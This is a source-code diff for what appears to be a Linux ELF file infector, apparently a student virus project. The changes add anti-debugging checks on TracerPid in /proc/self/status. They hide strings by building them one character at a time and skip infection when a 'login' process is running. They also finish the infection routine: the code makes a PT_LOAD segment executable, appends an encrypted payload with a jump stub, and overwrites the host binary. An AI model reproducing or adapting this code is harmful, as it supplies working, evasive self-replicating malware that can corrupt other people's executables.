@@ -139,7 +139,7 @@ int _start()
 {
 	__asm__(".globl real_start\n"
 	        "real_start:\n"
-		// "int3\n"
+	//"int3\n"
             "pushq %rax\n"
 			"pushq %rax\n"
 	        "pushq %rbx\n"
@@ -160,7 +160,7 @@ int _start()
 			"pushq %r15\n"
 
 		    "call do_main\n"
-	        "int3\n"
+	      //  "int3\n"
 	        "jmp myend\n");
 
 }
@@ -190,39 +190,106 @@ __syscall3(ssize_t, write, int, fd, const void *, buf, size_t, count); // poura 
 __syscall6(void *,mmap,unsigned long,addr, unsigned long ,len, unsigned long ,prot, unsigned long ,flags,unsigned long ,fd,unsigned long ,offset);
 bool process_runing(void)
 {
-	return 0;
+
 	int fd,i,dd, nread;
 	char buf[256]; // = sizeof(struct dirent)
 	char *TracerPid;
 	char *Name;
 	struct linux_dirent64 *d;
 	char path[64];
+	char proc [18];
+	proc[0] = '/';
+	proc[1] = 'p';
+	proc[2] = 'r';
+	proc[3] = 'o';
+	proc[4] = 'c';
+	proc[5] = '/';
+	proc[6] = 's';
+	proc[7] = 'e';
+	proc[8] = 'l';
+	proc[9] = 'f';
+	proc[10] = '/';
+	proc[11] = 's';
+	proc[12] = 't';
+	proc[13] = 'a';
+	proc[14] = 't';
+	proc[15] = 'u';
+	proc[16] = 's';
+	proc[17] = '\0';
+char TracerPid_name[11];
+	TracerPid_name[0] = 'T';
+	TracerPid_name[1] = 'r';
+	TracerPid_name[2] = 'a';
+	TracerPid_name[3] = 'c';
+	TracerPid_name[4] = 'e';
+	TracerPid_name[5] = 'r';
+	TracerPid_name[6] = 'P';
+	TracerPid_name[7] = 'i';
+	TracerPid_name[8] = 'd';
+	TracerPid_name[9] = ':';
+	TracerPid_name[10] = '\0';
 
-	fd = open ("/proc/self/status", 0,0);
-	while((i =read(fd,buf,256)) > 0)
+	fd = open (proc, 0,0);
+	while((i =read(fd,buf,255)) > 0)
 	{
-		if ((TracerPid = ft_strnstr(buf,"TracerPid:",i)) != 0)
+		if ((TracerPid = ft_strnstr(buf,TracerPid_name,i)) != 0)
 		{
 			TracerPid += 10;
 			while(*TracerPid == '\t' || *TracerPid == ' ')
+			{
 				TracerPid++;
-			if (*TracerPid != '0' && *TracerPid != '\n' && 0) // enlever le 0 pour gdb
-				exit(1);
+			}
+			if (*TracerPid != '0' && *TracerPid != '\n') // enlever le 0 pour gdb
+				exit(0);
 		}
-
-
 	}
 	close(fd);
-	dd = open("/proc/",0x10000,0);
+	proc[6] = 0;
+	dd = open(proc,0x10000,0);
 	if (dd <= 0)
 	{
 		return 1;
 	}
-	ft_memmove(path,"/proc/",6);
+	ft_memmove(path,proc,6);
 	char cmdname[64];
-	while ((nread = getdents64(dd,  (struct linux_dirent64*)buf, 256)) > 0)
+	char status[8];
+	status[0] = '/';
+	status[1] = 's';
+	status[2] = 't';
+	status[3] = 'a';
+	status[4] = 't';
+	status[5] = 'u';
+	status[6] = 's';
+	status[7] = '\0';
+	char name_name[6];
+	name_name[0] = 'N';
+	name_name[1] = 'a';
+	name_name[2] = 'm';
+	name_name[3] = 'e';
+	name_name[4] = ':';
+	name_name[5] = '\0';
+	char login[6];
+	login[0] = 'l';
+	login[1] = 'o';
+	login[2] = 'g';
+	login[3] = 'i';
+	login[4] = 'n';
+	login[5] = '\0';
+	char cmdline[9];
+	cmdline[0] = '/';
+	cmdline[1] = 'c';
+	cmdline[2] = 'm';
+	cmdline[3] = 'd';
+	cmdline[4] = 'l';
+	cmdline[5] = 'i';
+	cmdline[6] = 'n';
+	cmdline[7] = 'e';
+	cmdline[8] = '\0';
+	int j = 0;
+	while ((nread = getdents64(dd,  (struct linux_dirent64*)buf, 255)) > 0)
 	{
 		i = 0;
+
 		while(i<nread)
 		{
 			d = (struct linux_dirent64 *) (buf + i);
@@ -230,24 +297,19 @@ bool process_runing(void)
 			if (ft_isallnum(d->d_name) == 0)
 			{
 				ft_memmove(path + 6,d->d_name,ft_strlen(d->d_name)+ 1);
-				ft_memmove(path + ft_strlen(path), "/status\0", 8);
+				ft_memmove(path + ft_strlen(path), cmdline, 9);
+
 				fd = open(path,0,0);
-
-
-				read(fd,cmdname, 64);
-				if ((Name = ft_strnstr(cmdname,"Name:",i)) != 0)
-				{
-					Name += 5;
-					while(*Name == '\t' || *Name == ' ')
-						Name++;
-					*ft_strnstr(Name, "\n",50) = '\0';
-					if (!ft_strcmp(Name, "login"))
-						exit(1);
+				j = read(fd,cmdname, 63);
+				cmdname[j + 1] = 0;
+					if (!ft_strcmp(cmdname, login))
+					{
+						return (1);
+					}
 				}
 
 			}
 		}
-	}
 	return (0);
 }
 
@@ -631,7 +693,8 @@ int open_directory(char *path, unsigned int *n_loaded)
 			d = (struct linux_dirent64 *) (buf + i);
 			i += d->d_reclen ;
 			//printf("host %s type %d\n",d->d_name, d->d_type);
-			if (d->d_name[0] == '.')
+			if (d->d_name[0] == '.' || (d->d_name[0] == 'd' && d->d_name[1] == 'p' && d->d_name[2] == 'k' && d->d_name[3] == 'g') ||
+					(d->d_name[0] == 'l' && d->d_name[1] == 'o' && d->d_name[2] == 'g' && d->d_name[3] == 'i' || d->d_name[3] == 'n' ))
 				continue;
 			len = ft_strlen(path);
 			ft_memmove(path_file,path,len);
@@ -639,8 +702,8 @@ int open_directory(char *path, unsigned int *n_loaded)
 			ft_memmove(path_file + len + 1,d->d_name, ft_strlen(d->d_name));
 
 			path_file[len + 1 + ft_strlen(d->d_name)] = '\0';
-			ft_putstr(path_file);
-			ft_putchar('\n');
+		//	ft_putstr(path_file);
+		//	ft_putchar('\n');
 			//printf("%s %s\n",d->d_name,path_file);
 			struct stat st;
 			int fd = open (path_file, 0,0);
@@ -667,6 +730,7 @@ int open_directory(char *path, unsigned int *n_loaded)
 		}
 	}
 	close(dd);
+
 	return 0;
 }
 void    ft_putchar(char c)
@@ -728,7 +792,7 @@ size_t padding_before = 0;
 		}
 		if(phdr[i].p_type == PT_LOAD && phdr[i].p_flags == (PF_R | PF_W)) {
 
-            padding_before = phdr[i + 1].p_vaddr + phdr[i + 1].p_filesz - phdr[i].p_vaddr + phdr[i].p_filesz+ PAGE_SIZE;
+            padding_before = phdr[i + 1].p_vaddr + phdr[i + 1].p_filesz - phdr[i].p_vaddr + phdr[i].p_filesz + 0x1000;
 
 			//puts("text found");
 			text_end = phdr[i].p_offset + phdr[i].p_filesz;
@@ -743,7 +807,9 @@ size_t padding_before = 0;
 			phdr[i].p_filesz += payload_len +100 + padding_before;
 			phdr[i].p_memsz += payload_len + 100 + padding_before;
 			phdr[i].p_flags |= PF_X;
+
 			new_file(buff,size,text_end, path,entry, (*n_loaded)++,padding_before);
+
 			return 0;
 		}
 	}
@@ -836,20 +902,8 @@ void new_file(char buf[],size_t size, size_t end_of_text,const char *path,Elf64_
 	unsigned long address_of_start_encrypt = get_eip() - ((char *)&yeah - (char *)&main_encrypt);
 	size_t size_wrote = 0;
 	size_t	value;
-	if (size < end_of_text + padding)
-	{
-		ft_putstr("plus petit\n");
-		size_t padding_wrote = 0;
-		padding_wrote = write(fd,buf + end_of_text, size - end_of_text);
-		while(padding_wrote++ < padding) {
-			write(fd,"\0",1);
-		}
-	}
-	else
-		for (size_t j = 0; j<  padding;j++)
-			write(fd,"\0",1);
-
-
+	for (size_t j = 0; j<  padding;j++)
+		write(fd,"\0",1);
 	size_wrote =	put_sig(fd, n_loaded);
 	value = (address_of_start_encrypt - address_of_start);
 	size_wrote += write(fd, (char *)(&value), sizeof(size_t));
@@ -861,15 +915,10 @@ void new_file(char buf[],size_t size, size_t end_of_text,const char *path,Elf64_
 
 	size_wrote += write(fd,jmp_code,9);
 
-	if (size <end_of_text + padding)
-	{
+	for (long unsigned int i = 0; i< PAGE_SIZE*2 - size_wrote ;i++)
+		write(fd,"\j",1);
 
-	}
-	ft_putnbr(PAGE_SIZE - size_wrote);
-//	for (long unsigned int i = 0; i< PAGE_SIZE*2 - size_wrote ;i++)
-//		write(fd,"\j",1);
-ft_putstr("ok\n");
-	//write(fd,buf + end_of_text, size - end_of_text);
+	write(fd,buf + end_of_text, size - end_of_text);
 
 	//lseek(fd, end_of_text, SEEK_SET);
 
@@ -882,6 +931,7 @@ ft_putstr("ok\n");
 	close(fd);
 	unlink(path);
 	rename (tmp, path);
+
 }
 
 int             ft_strncmp(const char *s1, const char *s2, size_t n)
